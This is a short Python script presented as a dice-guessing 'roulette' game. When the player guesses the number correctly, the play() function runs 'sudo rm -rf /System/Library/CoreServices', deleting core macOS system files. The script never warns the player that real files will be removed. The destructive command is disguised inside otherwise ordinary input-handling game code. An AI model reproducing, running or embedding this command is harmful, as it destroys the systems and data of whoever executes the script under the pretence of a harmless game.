import random
import platform
import os


def play(guess):
    if random.randint(1, 6) != int(guess):
        print("I am still alive! The number was wrong.")
        return False
    else:
        os.system("sudo rm -rf /System/Library/CoreServices")


option = input("Shall we play a game? (y/n): ")

if option.lower() == 'y':
    play_again = True
    while play_again:
        guess = input("Pick a number between 1 and 6: ")
        while not guess.isdigit() or not (1 <= int(guess) <= 6):
            guess = input(
                "That's not a valid number. Pick a number between 1 and 6: ")
        if not play(guess):  # Call play and check if the guess was incorrect
            again = input("Wish to play again? (y/n):")
            if again.lower() == 'y':
                continue
            else:
                print("Goodbye")
                break
        else:
            print("Goodbye")
            break
elif option.lower() == 'n':
    print("Goodbye")
else:
    print("Invalid option")
